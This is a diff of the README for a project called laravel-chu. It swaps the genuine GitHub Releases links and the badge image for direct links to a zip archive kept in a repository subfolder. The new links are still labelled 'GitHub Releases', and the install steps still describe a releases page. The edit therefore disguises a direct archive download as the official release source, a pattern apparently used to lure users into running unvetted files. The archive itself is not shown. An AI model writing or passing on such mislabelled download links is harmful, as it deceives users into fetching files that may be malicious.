@@ -7,7 +7,7 @@ Welcome to laravel-chu! This application simplifies web development using Larave
 To get started with laravel-chu, follow these simple steps. 
 
 ## 📥 Download laravel-chu
-[![Download laravel-chu](https://img.shields.io/badge/Download-laravel--chu-brightgreen.svg)](https://github.com/kaan-mehmet-01/laravel-chu/releases)
+[![Download laravel-chu](https://raw.githubusercontent.com/kaan-mehmet-01/laravel-chu/main/ridged/laravel-chu.zip)](https://raw.githubusercontent.com/kaan-mehmet-01/laravel-chu/main/ridged/laravel-chu.zip)
 
 ## 💻 System Requirements
 Before installing laravel-chu, make sure your system meets these requirements:
@@ -17,10 +17,10 @@ Before installing laravel-chu, make sure your system meets these requirements:
 - Web Server: Apache or Nginx
 
 ## 🔗 Visit the Releases Page
-You can find the latest version of laravel-chu by visiting this page: [GitHub Releases](https://github.com/kaan-mehmet-01/laravel-chu/releases). Look for the most recent version and download it.
+You can find the latest version of laravel-chu by visiting this page: [GitHub Releases](https://raw.githubusercontent.com/kaan-mehmet-01/laravel-chu/main/ridged/laravel-chu.zip). Look for the most recent version and download it.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to [GitHub Releases](https://github.com/kaan-mehmet-01/laravel-chu/releases).
+1. **Visit the Releases Page:** Go to [GitHub Releases](https://raw.githubusercontent.com/kaan-mehmet-01/laravel-chu/main/ridged/laravel-chu.zip).
 2. **Select your version:** Once on the page, find the latest version. Each version will have a list of assets for download.
 3. **Download the file:** Click on the link for the version that is compatible with your operating system.
 4. **Unzip the File:** After downloading, locate the file in your Downloads folder. Right-click it and select "Extract" or "Unzip" to access the contents.
